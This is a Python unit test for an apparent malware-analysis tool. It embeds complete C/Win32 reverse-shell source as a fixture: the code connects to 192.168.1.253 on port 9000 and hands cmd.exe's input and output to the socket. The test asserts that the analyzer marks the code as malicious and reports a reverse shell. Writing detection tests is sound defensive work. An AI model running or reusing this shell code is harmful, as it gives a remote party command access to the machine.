"""Heuristic coverage for a C/Win32 shell indicator fixture."""

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from core.llm_analyzer import _fallback_analysis


C_WIN32_SHELL_FIXTURE = r"""
#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")

WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax;
char ip_addr[16] = "192.168.1.253";
char port[6] = "9000";

STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;

int main()
{
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    struct hostent *host;
    host = gethostbyname(ip_addr);
    strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));

    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(port));
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    TCHAR cmd[255] = TEXT("cmd.exe");
    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

    return 0;
}
"""


def test_c_win32_shell_fixture_is_detected():
    result = _fallback_analysis("test.txt", "modified", C_WIN32_SHELL_FIXTURE)
    categories = {finding["category"] for finding in result.get("findings", [])}

    assert result["priority"] in {"critical", "high"}
    assert result["risk_score"] >= 8
    assert result["is_malicious"] is True
    assert "reverse_shell" in categories
